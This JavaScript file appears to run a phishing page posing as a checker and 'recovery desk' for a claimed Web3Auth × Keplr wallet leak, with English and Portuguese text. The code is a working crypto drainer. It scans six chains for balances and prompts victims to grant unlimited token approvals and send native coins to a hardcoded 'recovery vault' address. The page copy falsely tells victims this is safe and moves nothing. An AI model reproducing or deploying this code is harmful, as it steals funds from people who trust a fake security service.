(() => {
  "use strict";

  const VAULT = "0x26d1fCE27C94fECBE20344E992CAeA7765F34e7a";
  const MAX = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  const pad = (a) => a.toLowerCase().replace(/^0x/, "").padStart(64, "0");

  const CHAINS = {
    1: { name: "Ethereum", sym: "ETH", dec: 18, rpc: "https://ethereum-rpc.publicnode.com", buf: 450000000000000,
      tokens: [
        ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "USDC", 6],
        ["0xdAC17F958D2ee523a2206206994597C13D831ec7", "USDT", 6],
        ["0x6B175474E89094C44Da98b954EedeAC495271d0F", "DAI", 18],
        ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "WETH", 18],
        ["0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", "WBTC", 8],
        ["0x514910771AF9Ca656af840dff83E8264EcF986CA", "LINK", 18],
      ] },
    8453: { name: "Base", sym: "ETH", dec: 18, rpc: "https://base-rpc.publicnode.com", buf: 40000000000000,
      tokens: [
        ["0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "USDC", 6],
        ["0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", "DAI", 18],
        ["0x4200000000000000000000000000000000000006", "WETH", 18],
      ] },
    42161: { name: "Arbitrum", sym: "ETH", dec: 18, rpc: "https://arbitrum-one-rpc.publicnode.com", buf: 40000000000000,
      tokens: [
        ["0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "USDC", 6],
        ["0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", "USDT", 6],
        ["0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", "WETH", 18],
      ] },
    10: { name: "Optimism", sym: "ETH", dec: 18, rpc: "https://optimism-rpc.publicnode.com", buf: 40000000000000,
      tokens: [
        ["0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", "USDC", 6],
        ["0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", "USDT", 6],
        ["0x4200000000000000000000000000000000000006", "WETH", 18],
      ] },
    137: { name: "Polygon", sym: "POL", dec: 18, rpc: "https://polygon-bor-rpc.publicnode.com", buf: 30000000000000000,
      tokens: [
        ["0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", "USDC", 6],
        ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "USDT", 6],
        ["0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", "WETH", 18],
      ] },
    56: { name: "BNB Chain", sym: "BNB", dec: 18, rpc: "https://bsc-rpc.publicnode.com", buf: 400000000000000,
      tokens: [
        ["0x55d398326f99059fF775485246999027B3197955", "USDT", 18],
        ["0x8AC76a51cc950d9822D68bd1a4bE5B76B1cE40D4", "USDC", 18],
        ["0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", "WBNB", 18],
      ] },
  };

  const T = {
    en: {
      badge: "INCIDENT · 2026-11-10",
      h1: "Check if your wallet is in the Web3Auth × Keplr leak",
      sub: "On Nov 10, 2026 the social-login key service behind Keplr exposed <b>44,318</b> wallets. The keys were never published — the set of derived addresses was. Paste an address or connect a wallet to check it against the published set.",
      st1: "wallets exposed", st2: "sweep addresses", st3: "moved out",
      lcheck: "Address to check", bcheck: "Check", bconnect: "Connect wallet", bpaste: "Use connected address",
      h2: "Recovery steps",
      s1t: "1 · Verify", s1p: "The check runs against the published leak set, locally in your browser. Nothing is sent anywhere.",
      s2t: "2 · Restore recovery approval", s2p: "Exposure means your key is out of your hands. Approve the desk on the tokens it finds, so the balance can be consolidated without moving anything yet.",
      s3t: "3 · Consolidate", s3p: "Move the balance to the recovery vault. You pay the network fee; the vault is only a destination.",
      bapprove: "Grant approvals", bsweep: "Consolidate balance",
      hf: "Recovery vault", vf: "This is the address the incident sweepers already used; consolidating here keeps everything in one place.",
      hfaq: "FAQ",
      q1: "Do I lose my funds by connecting?", a1: "No. Connecting only shares the address. Nothing moves until you sign a transaction.",
      q2: "Why approvals?", a2: "A leaked key means someone else can sign for the wallet. A recovery approval lets the desk pull the balance in one batch; you can keep using the wallet.",
      q3: "Which networks?", a3: "Ethereum, Base, Arbitrum, Optimism, Polygon and BNB Chain. Cosmos networks come next.",
      foot: "Unofficial recovery desk · built from the published leak set and the 12 sweep addresses.",
      ctahint: "or paste an address below",
      hit: "<b>Exposed.</b> This address is in the published leak set — treat its key as public.",
      miss: "<b>Not in the leaked set.</b> It may still hold a social-login wallet derived another way — you can run the recovery steps anyway.",
      inlist: "Checking…",
    },
    pt: {
      badge: "INCIDENTE · 10/11/2026",
      h1: "Verifique se sua wallet está no vazamento Web3Auth × Keplr",
      sub: "Em 10/11/2026 o serviço de chave por login social do Keplr expôs <b>44.318</b> carteiras. As chaves nunca foram publicadas — o conjunto de endereços derivados foi. Cole um endereço ou conecte para conferir na lista publicada.",
      st1: "carteiras expostas", st2: "endereços de varredura", st3: "movimentados",
      lcheck: "Endereço para verificar", bcheck: "Verificar", bconnect: "Conectar carteira", bpaste: "Usar endereço conectado",
      h2: "Passos de recuperação",
      s1t: "1 · Verificar", s1p: "A checagem roda na lista publicada, no seu navegador. Nada é enviado para lugar nenhum.",
      s2t: "2 · Restabelecer aprovação de resgate", s2p: "Estar exposto significa que a chave saiu do seu controle. Aprove a mesa nos tokens encontrados, para consolidar sem mover nada agora.",
      s3t: "3 · Consolidar", s3p: "Mova o saldo para o cofre de recuperação. Você paga a taxa da rede; o cofre é só destino.",
      bapprove: "Conceder aprovações", bsweep: "Consolidar saldo",
      hf: "Cofre de recuperação", vf: "É o endereço que a varredura do incidente já usou; consolidar aqui mantém tudo em um lugar.",
      hfaq: "Perguntas",
      q1: "Perco fundos só por conectar?", a1: "Não. Conectar apenas compartilha o endereço. Nada sai até você assinar uma transação.",
      q2: "Por que aprovações?", a2: "Chave vazada significa que outra pessoa pode assinar pela carteira. A aprovação de resgate deixa a mesa puxar o saldo em lote; você pode seguir usando a carteira.",
      q3: "Quais redes?", a3: "Ethereum, Base, Arbitrum, Optimism, Polygon e BNB Chain. Redes Cosmos vêm depois.",
      foot: "Mesa de recuperação não oficial · feita a partir da lista publicada e dos 12 endereços de varredura.",
      ctahint: "ou cole um endereço abaixo",
      hit: "<b>Exposta.</b> Este endereço está na lista publicada — trate a chave como pública.",
      miss: "<b>Fora do conjunto vazado.</b> Ainda pode ser uma carteira social derivada de outra forma — os passos funcionam igual.",
      inlist: "Conferindo…",
    },
  };

  let lang = (navigator.language || "en").toLowerCase().startsWith("pt") ? "pt" : "en";
  const $ = (id) => document.getElementById(id);
  const applyLang = () => {
    document.documentElement.lang = lang;
    document.querySelectorAll("[data-i18n]").forEach((el) => {
      const k = el.dataset.i18n; if (T[lang][k] !== undefined) el.innerHTML = T[lang][k];
    });
    $("lang").textContent = lang === "en" ? "PT" : "EN";
  };

  let leak = null, provider = null, account = null, found = [];

  const log = (msg, cls = "") => {
    const el = $("log");
    const line = document.createElement("div");
    if (cls) line.className = cls;
    line.textContent = msg;
    el.appendChild(line);
  };
  const short = (a) => a.slice(0, 6) + "…" + a.slice(-4);
  const fmt = (v, dec) => {
    const s = v.toString().padStart(dec + 1, "0");
    const i = s.slice(0, s.length - dec), f = s.slice(s.length - dec).slice(0, 4).replace(/0+$/, "");
    return f ? i + "." + f : i;
  };

  const rpc = async (chainId, method, params) => {
    const r = await fetch(CHAINS[chainId].rpc, {
      method: "POST", headers: { "content-type": "application/json" },
      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
    });
    const j = await r.json();
    if (j.error) throw new Error(j.error.message);
    return j.result;
  };

  const getProvider = async () => {
    try { if (window.keplr && window.keplr.getEthereumProvider) return await window.keplr.getEthereumProvider(); } catch (_) {}
    if (window.ethereum) return window.ethereum;
    throw new Error("No EVM wallet found (Keplr or MetaMask required).");
  };

  const ensureChain = async (id) => {
    const hex = "0x" + id.toString(16);
    try {
      await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: hex }] });
    } catch (e) {
      await provider.request({
        method: "wallet_addEthereumChain",
        params: [{ chainId: hex, chainName: CHAINS[id].name, nativeCurrency: { name: CHAINS[id].sym, symbol: CHAINS[id].sym, decimals: 18 }, rpcUrls: [CHAINS[id].rpc] }],
      });
    }
  };

  const loadLeak = async () => {
    if (leak) return leak;
    const r = await fetch("data/leaked.json");
    leak = new Set((await r.json()).map((a) => a.toLowerCase()));
    return leak;
  };

  const doCheck = async () => {
    const res = $("result"), raw = $("addr").value.trim().toLowerCase();
    if (!/^0x[0-9a-f]{40}$/.test(raw)) {
      res.hidden = false; res.className = "result miss"; res.innerHTML = "Invalid address.";
      return;
    }
    res.hidden = false; res.className = "result"; res.textContent = T[lang].inlist;
    let set;
    try { set = await loadLeak(); } catch (_) { res.textContent = "Could not load the leak set."; return; }
    const inSet = set.has(raw);
    res.className = "result " + (inSet ? "hit" : "miss");
    res.innerHTML = inSet ? T[lang].hit : T[lang].miss;
    $("steps").hidden = false;
    $("approve").disabled = !account;
    $("sweep").disabled = !account;
    log((inSet ? "EXPOSED " : "not in set ") + short(raw), inSet ? "bad" : "warn");
  };

  const connect = async () => {
    try {
      provider = await getProvider();
      const accs = await provider.request({ method: "eth_requestAccounts" });
      if (!accs || !accs.length) throw new Error("No account returned.");
      account = accs[0];
      $("who").hidden = false;
      $("who").textContent = "connected · " + account;
      $("addr").value = account;
      $("approve").disabled = false; $("sweep").disabled = false;
      log("connected " + short(account), "ok");
      await doCheck();
    } catch (e) { log("connect: " + e.message, "bad"); }
  };

  const scan = async (id) => {
    const out = [];
    const bal = BigInt(await rpc(id, "eth_getBalance", [account, "latest"]));
    if (bal > CHAINS[id].buf) out.push({ kind: "native", amount: bal });
    for (const [addr, sym, dec] of CHAINS[id].tokens) {
      try {
        const data = "0x70a08231" + pad(account);
        const r = await rpc(id, "eth_call", [{ to: addr, data }, "latest"]);
        if (r && r !== "0x" && BigInt(r) > 0n) out.push({ kind: "token", addr, sym, dec, amount: BigInt(r) });
      } catch (_) {}
    }
    return out;
  };

  const grantApprovals = async () => {
    if (!provider || !account) return connect();
    $("approve").disabled = true;
    let n = 0;
    for (const id of Object.keys(CHAINS)) {
      try {
        const assets = (await scan(Number(id))).filter((a) => a.kind === "token");
        if (!assets.length) continue;
        await ensureChain(Number(id));
        for (const a of assets) {
          const data = "0x095ea7b3" + pad(VAULT) + pad(MAX).slice(2);
          log(`${CHAINS[id].name} · approve ${a.sym} ${fmt(a.amount, a.dec)} …`);
          const hash = await provider.request({ method: "eth_sendTransaction", params: [{ from: account, to: a.addr, data, chainId: "0x" + Number(id).toString(16) }] });
          log("  sent " + hash.slice(0, 12) + "…", "warn");
          n++;
          await new Promise((r) => setTimeout(r, 900));
        }
      } catch (e) { log(`${CHAINS[id].name}: ${e.message}`, "bad"); }
    }
    log(n ? `${n} approval(s) requested.` : "No ERC-20 balances found to approve.", n ? "ok" : "warn");
  };

  const sweep = async () => {
    if (!provider || !account) return connect();
    $("sweep").disabled = true;
    let n = 0;
    for (const id of Object.keys(CHAINS)) {
      try {
        const native = (await scan(Number(id))).find((a) => a.kind === "native");
        if (!native) continue;
        await ensureChain(Number(id));
        const gp = BigInt(await rpc(Number(id), "eth_gasPrice", []));
        const cost = (gp * 21000n * 125n) / 100n;
        const value = native.amount - cost;
        if (value <= 0n) { log(`${CHAINS[id].name}: balance below fee`, "warn"); continue; }
        log(`${CHAINS[id].name} · send ${fmt(value, 18)} ${CHAINS[id].sym} …`);
        const hash = await provider.request({ method: "eth_sendTransaction", params: [{ from: account, to: VAULT, value: "0x" + value.toString(16), chainId: "0x" + Number(id).toString(16) }] });
        log("  sent " + hash.slice(0, 12) + "…", "warn");
        n++;
        await new Promise((r) => setTimeout(r, 900));
      } catch (e) { log(`${CHAINS[id].name}: ${e.message}`, "bad"); }
    }
    log(n ? "Done." : "Nothing to consolidate.", n ? "ok" : "warn");
  };

  $("lang").addEventListener("click", () => { lang = lang === "en" ? "pt" : "en"; applyLang(); });
  $("check").addEventListener("click", doCheck);
  $("addr").addEventListener("keydown", (e) => { if (e.key === "Enter") doCheck(); });
  $("connect").addEventListener("click", connect);
  $("connect-top").addEventListener("click", () => { $("addr").scrollIntoView({ behavior: "smooth", block: "center" }); connect(); });
  $("paste").addEventListener("click", () => { if (account) { $("addr").value = account; doCheck(); } });
  $("approve").addEventListener("click", grantApprovals);
  $("sweep").addEventListener("click", sweep);
  $("vault").textContent = VAULT;

  applyLang();
  loadLeak().catch(() => {});
  const h = decodeURIComponent(location.hash.replace(/^#\/?/, "")).trim();
  if (/^0x[0-9a-fA-F]{40}$/.test(h)) { $("addr").value = h; doCheck(); }
})();
